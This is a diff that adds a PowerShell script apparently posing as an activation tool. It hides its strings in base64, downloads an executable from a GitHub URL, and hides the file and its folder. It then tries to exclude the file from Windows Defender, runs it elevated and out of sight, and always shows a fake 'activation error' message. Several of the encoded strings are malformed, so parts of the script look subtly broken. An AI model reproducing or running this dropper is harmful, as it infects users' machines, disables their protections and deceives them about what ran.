@@ -1,0 +1,40 @@
+$downloadUrlB64 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0FCSVJIT1NTQUlOMTAvRW1haWwtYm9tYmluZy9yZWZzL2hlYWRzL21haW4vY2FsYy5leGU="
+$updaterExeB64 = "dXBkYXR1ci5leGU="
+$hiddenAttrB64 = "SG1kZGVu"
+$silentlyContinueB64 = "U21sZW5@bH1jb25@aW51ZQ=="
+$stopActionB64 = "U3RvcA=="
+$directoryB64 = "RGlyZWN@b335"
+$runAsB64 = "UnVuQXM="
+
+$downloadUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($downloadUrlB64))
+$updaterExe = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($updaterExeB64))
+$hiddenAttr = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($hiddenAttrB64))
+$silentlyContinue = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($silentlyContinueB64))
+$stopAction = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($stopActionB64))
+$directory = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($directoryB64))
+$runAs = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($runAsB64))
+
+$hiddenFolder = Join-Path $env:LOCALAPPDATA ([System.Guid]::NewGuid().ToString())
+New-Item -ItemType Directory -Path $hiddenFolder | Out-Null
+
+$tempPath = Join-Path $hiddenFolder $updaterExe
+
+function Add-Exclusion {
+    param ([string]$Path)
+    try {
+        Add-MpPreference -ExclusionPath $Path -ErrorAction $silentlyContinue
+    } catch {}
+}
+
+try {
+    Invoke-WebRequest -Uri $downloadUrl -OutFile $tempPath -UseBasicParsing
+    Set-ItemProperty -Path $hiddenFolder -Name Attributes -Value $hiddenAttr
+    Set-ItemProperty -Path $tempPath -Name Attributes -Value $hiddenAttr
+    Add-Exclusion -Path $tempPath
+    Start-Process -FilePath $tempPath -WindowStyle Hidden -Verb $runAs
+    Remove-Item $hiddenFolder -Recurse -Force
+} catch {
+    exit 1
+} finally {
+    Write-Host "An error occurred during activation. Please try again."
+}
